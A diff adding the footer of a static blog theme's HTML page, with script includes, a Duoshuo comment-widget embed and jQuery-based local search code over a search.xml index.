+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"whiteHat001"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+    <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = true;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = data.url;
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '' && data_content != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title < 0 && index_content < 0 ){
+                                isMatch = false;
+                            } else {
+                                if (index_content < 0) {
+                                    index_content = 0;
+                                }
+                                if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            }
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
